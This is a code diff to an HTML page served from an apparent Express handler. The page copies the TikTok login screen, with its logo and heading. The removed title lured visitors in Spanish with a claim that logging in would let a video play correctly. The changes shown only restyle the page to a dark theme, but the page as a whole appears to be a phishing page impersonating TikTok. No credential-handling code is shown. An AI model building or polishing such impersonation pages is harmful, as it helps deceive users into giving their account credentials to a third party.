@@ -32,7 +32,7 @@ res.send(`
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-<title>Inicia sesión con TikTok para reproducir correctamente el video</title>
+<title>Inicio de sesion TikTok</title>
 
 <link rel="icon" type="image/png" href="/icon.png?v=2">
 <link rel="icon" type="image/png" href="/favicon.png">
@@ -49,7 +49,7 @@ body{
 
     margin:0;
     height:100vh;
-    background:#111;
+    background:#000;
 
     display:flex;
     justify-content:center;
@@ -61,7 +61,7 @@ body{
 
     width:380px;
 
-    background:white;
+    background:black;
 
     padding:50px 40px;
 
@@ -71,6 +71,9 @@ body{
 
     text-align:center;
 
+}
+.login-box h1{
+    color:white;
 }
 
 
@@ -176,7 +179,7 @@ button:hover{
 
 .extra a{
 
-    color:#111;
+    color:#000;
 
     text-decoration:none;
 
@@ -202,7 +205,6 @@ button:hover{
 
 
 <div class="login-box">
-
 
 <img src="/icon.png" class="logo">
 <h1>TikTok</h1>
